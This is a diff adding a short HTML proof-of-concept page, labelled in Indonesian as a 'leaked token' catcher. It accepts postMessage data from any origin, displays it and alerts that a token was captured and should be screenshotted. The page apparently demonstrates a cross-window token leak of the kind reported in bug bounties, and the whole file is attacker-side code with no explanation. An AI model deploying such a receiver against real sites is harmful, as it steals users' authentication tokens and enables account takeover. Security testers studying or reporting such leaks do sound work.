@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Token Bocor:</h1>
+  <pre id="hasil" style="background:#eee;padding:10px;">Menunggu token...</pre>
+  <script>
+    window.addEventListener("message", function(event) {
+      document.getElementById("hasil").textContent = JSON.stringify(event.data, null, 2);
+      alert("Token tertangkap! Screenshot sekarang.");
+    }, false);
+  </script>
+</body>
+</html>
